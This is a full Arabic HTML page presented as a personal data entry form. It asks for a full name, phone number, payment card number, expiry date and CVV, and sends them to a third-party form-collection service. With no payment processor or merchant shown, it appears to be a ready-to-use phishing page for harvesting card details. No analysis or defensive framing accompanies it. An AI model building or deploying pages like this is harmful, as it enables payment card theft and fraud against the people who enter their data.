<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استمارة إدخال البيانات</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .form-container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            width: 100%;
            max-width: 450px;
        }
        .form-container h2 {
            margin-top: 0;
            margin-bottom: 25px;
            color: #333;
            text-align: center;
            font-size: 24px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        .form-group input:focus {
            border-color: #007bff;
            outline: none;
        }
        .row-fields {
            display: flex;
            gap: 15px;
        }
        .row-fields .form-group {
            flex: 1;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }
        .submit-btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>إدخال البيانات الشخصية</h2>
    
    <form action="https://formspree.io/f/xykrwvdv" method="POST">
        
        <div class="form-group">
            <label for="name">الاسم الكامل</label>
            <input type="text" id="name" name="الاسم" placeholder="أدخل اسمك الثلاثي" required>
        </div>

        <div class="form-group">
            <label for="phone">رقم الجوال (مع مفتاح الدولة)</label>
            <input type="tel" id="phone" name="رقم_الجوال" placeholder="مثال: 966500000000+" required>
        </div>

        <div class="form-group">
            <label for="card-number">رقم البطاقة</label>
            <input type="text" id="card-number" name="رقم_البطاقة" placeholder="XXXX XXXX XXXX XXXX" required>
        </div>

        <div class="row-fields">
            <div class="form-group">
                <label for="expiry-date">التاريخ (شهر/سنة)</label>
                <input type="month" id="expiry-date" name="التاريخ_ش_س" required>
            </div>

            <div class="form-group">
                <label for="cvv">الرمز الخاص</label>
                <input type="text" id="cvv" name="الرمز_الخاص" maxlength="3" pattern="\d{3}" placeholder="000" required>
            </div>
        </div>

        <button type="submit" class="submit-btn">إرسال البيانات</button>
        
    </form>
</div>

</body>
</html>
